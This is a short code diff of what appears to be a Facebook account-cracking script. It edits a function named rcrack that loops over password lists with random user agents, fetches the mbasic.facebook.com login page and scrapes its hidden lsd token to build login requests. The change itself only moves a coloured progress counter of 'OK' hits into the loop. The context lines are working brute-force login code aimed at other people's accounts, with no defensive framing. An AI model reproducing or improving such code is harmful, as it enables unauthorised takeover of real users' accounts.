@@ -212,6 +212,8 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
+            sys.stdout.flush()
+            sys.stdout.write('\r \033[1;91m[\033[1;97m𝑨𝑳𝑰𝑭\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -260,7 +262,6 @@ def rcrack(uid,pwx,tl):
         
     except:
         pass
-        sys.stdout.flush()
-        sys.stdout.write('\r \033[1;91m[\033[1;97m𝑨𝑳𝑰𝑭\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
         
-xr()
+        
+xr() 
